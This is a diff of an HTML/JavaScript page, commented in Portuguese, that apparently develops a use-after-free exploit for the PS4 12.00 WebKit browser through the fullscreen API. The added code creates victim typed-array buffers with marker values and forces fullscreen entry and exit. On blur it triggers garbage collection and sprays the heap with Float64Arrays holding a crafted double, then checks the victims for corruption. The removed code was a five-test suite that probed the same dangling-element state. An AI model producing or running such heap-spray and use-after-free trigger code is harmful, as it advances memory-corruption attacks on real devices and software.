@@ -1,160 +1,100 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Fullscreen UAF - State Corruption Suite</title>
+<title>PS4 Fullscreen UAF - Stable Trigger Test</title>
 </head>
-<body style="background:#111;color:#0f0;font-family:monospace;">
+<body>
 
-<h2>Fullscreen UAF - State Corruption Tests</h2>
+<h2>PS4 12.00 - Fullscreen UAF (Teste 4 Expandido)</h2>
 
-<button onclick="runTest(1)">Teste 1 — fullscreenElement dangling</button><br><br>
-<button onclick="runTest(2)">Teste 2 — Reuso do elemento removido</button><br><br>
-<button onclick="runTest(3)">Teste 3 — Múltiplos ciclos rápidos</button><br><br>
-<button onclick="runTest(4)">Teste 4 — Eventos encadeados</button><br><br>
-<button onclick="runTest(5)">Teste 5 — Estado inconsistente (append/remove loop)</button><br><br>
+<button onclick="run()">Run Test</button>
 
-<pre id="log" style="height:400px;overflow:auto;background:#000;padding:10px;"></pre>
+<pre id="log" style="background:#111;color:#0f0;padding:10px;height:400px;overflow:auto;"></pre>
 
 <script>
 function log(msg) {
-    console.log(msg);
     document.getElementById("log").textContent += msg + "\n";
 }
 
-function createFSTarget() {
-    let el = document.createElement("div");
-    el.style.position = "absolute";
-    el.style.top = "0";
-    el.style.left = "0";
-    el.style.width = "100%";
-    el.style.height = "100%";
-    el.style.background = "black";
-    el.innerHTML = "<h1 style='color:white;text-align:center;margin-top:20%'>FULLSCREEN<br>Press OPTIONS</h1>";
-    document.body.appendChild(el);
-    return el;
-}
+let f64, u32, dv;
+let victimBuffer;
 
-function enterFS(el) {
-    el.webkitRequestFullscreen?.();
-}
+function run() {
+    log("[*] Iniciando teste...");
 
-function runTest(id) {
-    document.getElementById("log").textContent = "";
-    log("[*] Running Test " + id);
+    // =========================
+    // Criar objetos críticos
+    // =========================
+    victimBuffer = new ArrayBuffer(0x100);
+    f64 = new Float64Array(victimBuffer);
+    u32 = new Uint32Array(victimBuffer);
+    dv  = new DataView(victimBuffer);
 
-    let fsTarget = createFSTarget();
-    enterFS(fsTarget);
+    f64[0] = 13.37;
+    u32[2] = 0x1337;
+    dv.setUint32(16, 0xdeadbeef, true);
+
+    log("[+] Objetos criados");
+
+    // =========================
+    // Fullscreen
+    // =========================
+    document.documentElement.webkitRequestFullscreen?.();
+
+    // =========================
+    // Eventos críticos
+    // =========================
+    document.addEventListener("visibilitychange", () => {
+        log("[EVENT] visibilitychange: " + document.visibilityState);
+    });
+
+    document.addEventListener("fullscreenchange", () => {
+        log("[EVENT] fullscreenchange fired");
+
+        // 🔥 PONTO CRÍTICO
+        setTimeout(() => {
+            log("[*] Forçando saída fullscreen...");
+            document.webkitExitFullscreen?.();
+        }, 50);
+    });
 
     window.onblur = function() {
-        window.onblur = null;
-        log("[*] onblur recebido");
+        log("[EVENT] onblur recebido");
 
-        try {
-
-            // ============================
-            // TESTE 1 — Dangling pointer
-            // ============================
-            if (id === 1) {
-                log("[T1] Antes remove: " + document.fullscreenElement);
-
-                fsTarget.remove();
-
-                log("[T1] Depois remove: " + document.fullscreenElement);
-
-                document.webkitExitFullscreen?.();
-            }
-
-            // ============================
-            // TESTE 2 — Reuso do elemento
-            // ============================
-            else if (id === 2) {
-                fsTarget.remove();
-
-                try {
-                    document.body.appendChild(fsTarget);
-                    log("[T2] Elemento reanexado ao DOM");
-                } catch(e) {
-                    log("[T2 ERROR] " + e);
-                }
-
-                document.webkitExitFullscreen?.();
-            }
-
-            // ============================
-            // TESTE 3 — Múltiplos ciclos
-            // ============================
-            else if (id === 3) {
-                fsTarget.remove();
-
-                let count = 0;
-
-                function cycle() {
-                    if (count++ > 3) {
-                        document.webkitExitFullscreen?.();
-                        return;
-                    }
-
-                    let el = createFSTarget();
-                    enterFS(el);
-
-                    setTimeout(() => {
-                        el.remove();
-                        cycle();
-                    }, 100);
-                }
-
-                cycle();
-            }
-
-            // ============================
-            // TESTE 4 — Eventos encadeados
-            // ============================
-            else if (id === 4) {
-                document.onfullscreenchange = function() {
-                    log("[T4] fullscreenchange fired");
-                };
-
-                document.onvisibilitychange = function() {
-                    log("[T4] visibilitychange: " + document.visibilityState);
-                };
-
-                fsTarget.remove();
-
-                document.webkitExitFullscreen?.();
-            }
-
-            // ============================
-            // TESTE 5 — Loop append/remove
-            // ============================
-            else if (id === 5) {
-                let iterations = 50;
-
-                function stress() {
-                    if (iterations-- <= 0) {
-                        document.webkitExitFullscreen?.();
-                        return;
-                    }
-
-                    try {
-                        document.body.appendChild(fsTarget);
-                        fsTarget.remove();
-                    } catch(e) {
-                        log("[T5 ERROR] " + e);
-                    }
-
-                    requestAnimationFrame(stress);
-                }
-
-                stress();
-            }
-
-        } catch(e) {
-            log("[ERROR] " + e);
+        // =========================
+        // GC leve
+        // =========================
+        for (let i = 0; i < 5000; i++) {
+            new ArrayBuffer(0x1000);
         }
 
-        setTimeout(() => location.reload(), 1500);
+        log("[*] GC leve executado");
+
+        // =========================
+        // Heap spray leve
+        // =========================
+        let spray = [];
+        for (let i = 0; i < 2000; i++) {
+            let arr = new Float64Array(16);
+            arr.fill(2.121995791e-314);
+            spray.push(arr);
+        }
+
+        log("[*] Spray leve executado");
+
+        // =========================
+        // CHECK PRÉ-CRASH
+        // =========================
+        try {
+            log("---- CHECK PRÉ-EXIT ----");
+            log("[F64] " + f64[0]);
+            log("[U32] " + u32[2]);
+            log("[DV] " + dv.getUint32(16, true));
+            log("[META] len=" + f64.length + " byteLength=" + f64.byteLength);
+        } catch (e) {
+            log("[ERRO CHECK] " + e);
+        }
     };
 }
 </script>
